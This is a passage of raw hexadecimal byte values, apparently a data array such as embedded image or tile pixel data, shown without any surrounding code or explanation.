0x11, 0x11, 0x11, 0x12, 0xE4, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE4, 0xE5, 0xE5, 0xE5, 0xE4, 0xE4, 0xE4, 0x14, 0x14, 0x08, 0x08, 0x08, 0x14,
0xE5, 0xCD, 0xE4, 0x14, 0x08, 0x9B, 0x9D, 0x9B, 0x9E, 0x9A, 0x9E, 0x9B, 0x9C, 0x9C, 0x9D, 0x9E,
0x9D, 0x9C, 0x9C, 0x9D, 0x9E, 0x08, 0x9A, 0x9A, 0x9E, 0x9B, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E,
0x9E, 0x9F, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9B, 0x9B, 0x9D, 0x9D, 0x9D, 0x9B, 0x9E, 0x9E, 0x9B, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x08,
0x08, 0x08, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F,
0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9E, 0x9E, 0x9E,
0x9A, 0x08, 0x08, 0xE4, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xCE, 0xE5, 0x14, 0x08, 0x9D, 0x9D,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x9D, 0x9F, 0xE5, 0xCF, 0xCF, 0xCE, 0xCE, 0xCF, 0xCF, 0xCF, 0x12, 0xE7, 0x14,
0x9D, 0x17, 0x9C, 0x17, 0x17, 0x9C, 0x9C, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9C, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x9B, 0x9C, 0x13, 0xE6, 0xE7, 0xCE, 0xCE, 0xCE, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0xE6, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x9A,
0x08, 0x08, 0xE4, 0xE3, 0xE5, 0x08, 0x9E, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9D, 0x9C, 0x9D, 0x9E,
0x9E, 0x9B, 0x9C, 0x9C, 0x9D, 0x9B, 0x9E, 0x9B, 0x9B, 0x9E, 0x9E, 0x9E, 0x9B, 0x9B, 0x9D, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x08, 0x08, 0x08, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9D, 0x9D, 0x9B, 0x9E, 0x9E, 0x9A,
0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x08, 0x08, 0x08,
0x08, 0x9F, 0x9F, 0x9F, 0x9F, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9D,
0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9E,
0x9E, 0x9F, 0x08, 0xE5, 0x12, 0x11, 0x11, 0x11, 0x11, 0xCF, 0xCE, 0xE4, 0x08, 0x9F, 0x9D, 0x9D,
0x9D, 0x9C, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9D, 0x14, 0xE7, 0xCF, 0xCF, 0xCE, 0xCE, 0xCF, 0x12, 0x12, 0x12, 0xE5, 0x9E,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9B, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x18, 0x17, 0x18, 0x17, 0x17, 0x18, 0x18, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x11, 0xCF, 0xE7, 0xE7, 0xCF, 0x12, 0x12, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xCA, 0x14, 0x08, 0x9A, 0x9A, 0x08, 0x9A, 0x9A, 0x9E, 0x9B, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x08, 0x08, 0x08, 0x08, 0x08, 0x9E, 0x9D, 0x9C, 0x17, 0x9C,
0x9D, 0x9E, 0x08, 0x08, 0xE4, 0xE4, 0x08, 0x9D, 0x9C, 0x9D, 0x9E, 0x9B, 0x9C, 0x9C, 0x9C, 0x9B,
0x9B, 0x9D, 0x9D, 0x9C, 0x9C, 0x17, 0x17, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D,
0x9D, 0x9D, 0x9E, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x08, 0x08, 0x9A,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9B, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14,
0x08, 0x9E, 0x9C, 0x17, 0x9C, 0x9C, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F,
0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9D, 0x9D, 0x9D, 0x9B, 0x9E,
0x9A, 0x08, 0x14, 0xCF, 0x11, 0x11, 0x11, 0x11, 0x12, 0xCE, 0xE6, 0xE4, 0x08, 0x9F, 0x9E, 0x9E,
0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C,
0x9C, 0x17, 0x9C, 0x08, 0xE5, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0xCE, 0x08, 0x9D,
0x17, 0x17, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17,
0x9C, 0x17, 0x17, 0x12, 0x11, 0x12, 0x12, 0xCF, 0x12, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12,
0x11, 0x11, 0x11, 0x12, 0xE3, 0x08, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9D, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x9C,
0x9D, 0x9E, 0x08, 0x08, 0x08, 0x14, 0xE4, 0xE4, 0x08, 0x9E, 0x9B, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D,
0x9D, 0x9D, 0x9B, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9B, 0x9E, 0x9D, 0x9C, 0x9C, 0x17, 0x17,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x16,
0x9B, 0x9A, 0x9A, 0x16, 0x9B, 0x9B, 0x9C, 0x9C, 0x9C, 0x9C, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14,
0x08, 0x9E, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9E, 0x9E, 0x9E,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E,
0x9E, 0x08, 0xE5, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x13, 0xE6, 0x14, 0x08, 0x9D, 0x9D, 0x9D,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C,
0x17, 0x17, 0x9D, 0x14, 0xCE, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0xCF, 0xE6, 0x08, 0x9C,
0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17,
0x9C, 0x9C, 0x9D, 0x9D, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x9C, 0x17, 0x9C, 0x17, 0x9C, 0x17,
0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C,
0x9C, 0x17, 0x17, 0x11, 0x11, 0x11, 0x11, 0x12, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xCA, 0x14, 0x9E, 0x9B, 0x9B, 0x9E, 0x9E, 0x9B, 0x9B, 0x9B, 0x9E, 0x9E, 0x08,
0x08, 0x08, 0x08, 0x9A, 0x9B, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x17, 0x9C, 0x9C, 0x9C,
0x9E, 0x9E, 0x08, 0x08, 0x08, 0x9E, 0x9E, 0x14, 0xE4, 0x14, 0x08, 0x9B, 0x9C, 0x17, 0x17, 0x9C,
0x9C, 0x9C, 0x9C, 0x9B, 0x9B, 0x9C, 0x9C, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x9C, 0x9C, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C,
0x9C, 0x9C, 0x9B, 0x9A, 0x9A, 0x9B, 0x9B, 0x9B, 0x9C, 0x9B, 0x9B, 0x9C, 0x9B, 0x9C, 0x9C, 0x9C,
0x9C, 0x9B, 0x9B, 0x9B, 0x9B, 0x9A, 0x9A, 0x9A, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9A, 0x9A, 0x9A,
0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14,
0x08, 0x9E, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9F, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9E, 0x9E, 0x9E,
0x08, 0x14, 0xCF, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE6, 0xE5, 0x14, 0x9F, 0x9B, 0x9D, 0x9D,
0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x9C, 0x9E, 0xE5, 0xCF, 0xCF, 0xCE, 0xCE, 0xCF, 0xCF, 0x12, 0xCF, 0x13, 0x14, 0x9B, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x11, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0xD1, 0x12, 0x12, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0xE6, 0x08, 0x9B, 0x9B, 0x9E, 0x08, 0x08, 0x08, 0x08, 0x9F, 0x9E, 0x9B, 0x9D,
0x9D, 0x9D, 0x9C, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9C, 0x17, 0x17, 0x17, 0x9C,
0x9D, 0x9A, 0x08, 0x08, 0x08, 0x9E, 0x9D, 0x9C, 0x08, 0xE4, 0xE4, 0x14, 0x08, 0x9E, 0x9B, 0x9B,
0x9B, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9B, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C,
0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C,
0x9C, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x9C, 0x9B, 0x9B, 0x9A, 0x9A, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x9D, 0x9C, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B,
0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9B, 0x9B, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9E, 0x9E, 0x9E, 0x9E,
0x08, 0x14, 0xCF, 0x11, 0x11, 0x11, 0x11, 0x12, 0xCF, 0xE6, 0x14, 0x08, 0x9E, 0x9D, 0x9C, 0x9C,
0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x9C, 0x9F, 0xCE, 0xCF, 0xCF, 0xCE, 0xCE, 0xCF, 0xCF, 0x12, 0xCF, 0xE3, 0x08, 0x9B, 0x9B,
0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x18, 0x17, 0x17, 0x17, 0x17, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x17, 0x9C, 0x17,
0x17, 0x17, 0x17, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xE5, 0x9F, 0x9E, 0x9E, 0x9E, 0x08, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D,
0x9D, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9D, 0x9E, 0x9E,
0x9A, 0x08, 0x08, 0x08, 0x9B, 0x9D, 0x9D, 0x9C, 0x9C, 0x9B, 0x08, 0xE4, 0x14, 0x08, 0x08, 0x08,
0x9A, 0x9B, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x9B, 0x9A,
0x99, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x08, 0x14, 0x08,
0x9B, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9E, 0x9E,
0x9E, 0x9F, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9E, 0x9A,
0x14, 0xE6, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xCE, 0xE5, 0x14, 0x9A, 0x9E, 0x9D, 0x9D, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x9D, 0x14, 0xCF, 0xCF, 0xCE, 0xCE, 0xCE, 0xCF, 0x12, 0x12, 0xCE, 0x14, 0x9B, 0x17, 0x9C,
0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9D, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18,
0x18, 0x18, 0x18, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xD1, 0x12, 0x12,
0x12, 0xCF, 0xCF, 0xE6, 0x9F, 0x9D, 0x9D, 0x9E, 0x9E, 0x9F, 0x08, 0x08, 0x08, 0x08, 0x08, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9E, 0x08, 0x08, 0x9B, 0x9B, 0x9D, 0x9D, 0x9D, 0x9C, 0x9B, 0x08, 0xE4, 0xE4, 0x08, 0x9B,
0x9A, 0x08, 0x08, 0x9E, 0x9C, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x17, 0x17,
0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9B, 0x9C, 0x9B, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x9B,
0x9B, 0x9B, 0x9B, 0x16, 0x16, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x17, 0x9A, 0x99, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08,
0x9E, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x17, 0x17,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x16, 0x16,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x16, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x16, 0x16, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B, 0x9E, 0x9E,
0x9E, 0x9E, 0x9B, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9A, 0x9E, 0x08,
0x14, 0xCF, 0x11, 0x11, 0x11, 0x11, 0x12, 0xCA, 0x13, 0xE4, 0x14, 0x9A, 0x9D, 0x9D, 0x9C, 0x9C,
0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x17,
0x9C, 0x9E, 0xE4, 0xCF, 0xCE, 0xCE, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0xE3, 0x08, 0x17, 0x17, 0x9C,
0x9C, 0x9C, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x9B, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D,
0x9C, 0x9C, 0x9C, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0xD0, 0xE9, 0xE7, 0xE8,
0xCF, 0x11, 0x11, 0xCF, 0x14, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x9F, 0x9F, 0x9F,
0x9F, 0x9F, 0x9E, 0x9E, 0x9D, 0x9E, 0x9E, 0x9E, 0x9D, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C,
0x9C, 0x9C, 0x9D, 0x9E, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x08, 0xE4, 0x14,
0x9B, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9C, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x17, 0x9C, 0x9A, 0x08, 0x08, 0x9A, 0x99, 0x08,
0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,
0x99, 0x99, 0x99, 0x99, 0x99, 0x9A, 0x9A, 0x16, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x17, 0x9B, 0x9A, 0x08, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
